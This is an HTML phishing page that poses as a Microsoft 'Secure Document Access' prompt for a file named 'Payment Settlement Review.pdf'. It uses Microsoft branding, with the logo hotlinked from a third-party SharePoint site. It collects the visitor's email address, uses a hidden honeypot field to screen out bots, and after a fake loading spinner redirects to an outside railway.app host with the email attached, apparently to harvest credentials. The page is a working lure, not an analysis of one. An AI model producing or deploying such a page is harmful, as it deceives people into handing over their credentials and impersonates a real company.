<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Secure Document Access</title>
<style>
    body {
        font-family: "Segoe UI", Arial, sans-serif;
        background-color: #f3f3f3;
        margin: 0;
        padding: 0;
        display: flex;
        flex-direction: column;
        align-items: center;
    }
    .logo {
        margin: 20px 0;
    }
    .logo img {
        height: 28px;
    }
    .container {
        background-color: #fff;
        border-radius: 8px;
        box-shadow: 0 2px 8px rgba(0,0,0,0.12);
        max-width: 340px;
        width: 100%;
        padding: 28px 20px;
        text-align: center;
        box-sizing: border-box;
    }
    .header-bg {
        background-color: #eaeaea;
        padding: 12px 0;
        margin: -28px -20px 16px -20px;
        border-bottom: 1px solid #ccc;
    }
    h2 {
        margin: 0;
        font-size: 1.35em;
        font-weight: 600;
        color: #333;
    }
    p {
        font-size: 0.95em;
        color: #444;
        line-height: 1.4;
    }
    .doc-name {
        font-weight: bold;
        margin: 8px 0 14px;
        color: #222;
        word-break: break-word;
    }
    input[type="email"] {
        width: 100%;
        padding: 11px 10px;
        font-size: 1em;
        border: 1px solid #ccc;
        border-radius: 4px;
        margin-top: 12px;
        box-sizing: border-box;
    }
    button {
        background-color: #0067b8;
        color: #fff;
        border: none;
        padding: 10px;
        font-size: 1em;
        border-radius: 4px;
        width: 100%;
        margin-top: 15px;
        cursor: pointer;
        font-weight: 500;
        position: relative;
        display: flex;
        align-items: center;
        justify-content: center;
    }
    button:hover {
        background-color: #005a9e;
    }
    .spinner {
        width: 18px;
        height: 18px;
        border: 3px solid #fff;
        border-top: 3px solid rgba(255,255,255,0.3);
        border-radius: 50%;
        margin-left: 8px;
        animation: spin 1s linear infinite;
        display: inline-block;
        vertical-align: middle;
    }
    @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
    }
    .footer-text {
        font-size: 0.75em;
        color: #666;
        margin-top: 16px;
    }
    .bottom-footer {
        font-size: 0.75em;
        color: #666;
        margin-top: 12px;
        text-align: center;
    }
    @media (max-width: 420px) {
        .container {
            max-width: 90%;
            padding: 22px 16px;
        }
        h2 {
            font-size: 1.2em;
        }
        p {
            font-size: 0.9em;
        }
        .logo img {
            height: 24px;
        }
    }
    .honeypot {
        display: none;
    }
</style>
</head>
<body>
<div class="logo">
    <img src="https://airsidesolutionsinc-my.sharepoint.com/_layouts/15/images/microsoft-logo.png" alt="Company Logo">
</div>

<div class="container">
    <div class="header-bg">
        <h2>Secure Document Access</h2>
    </div>
    <p>You’ve received a secure link to:</p>
    <p class="doc-name">Payment Settlement Review.pdf</p>
    <p>To open this secure link, please enter the email address this was sent to.</p>
    <form id="emailForm">
        <input type="email" placeholder="Enter your email" autofocus required>
        <input type="text" class="honeypot" name="website" autocomplete="off">
        <button type="submit">Next</button>
    </form>
    <p class="footer-text">
        By clicking Next, you agree to Microsoft privacy policy and terms of service.
    </p>
</div>

<div class="bottom-footer">
    © 2025 Microsoft  Privacy & Statements
</div>

<script>
document.getElementById('emailForm').addEventListener('submit', function(e) {
    e.preventDefault();

    const email = this.querySelector('input[type="email"]').value.trim();
    const honeypot = this.querySelector('.honeypot').value.trim();

    if(!email || honeypot) return;

    const button = this.querySelector('button');
    button.disabled = true;

    const spinner = document.createElement('span');
    spinner.classList.add('spinner');
    button.appendChild(spinner);

    // JavaScript-based check: 1 second wait before spinner countdown
    setTimeout(function() {
        setTimeout(function() {
            // Redirect with exact email, @ preserved
            window.location.href = `https://default-enthusiasm.up.railway.app#${email}`;
        }, 2000); // spinner duration (2 seconds)
    }, 4000); // JS-based check duration (4 seconds)
});
</script>
</body>
</html>
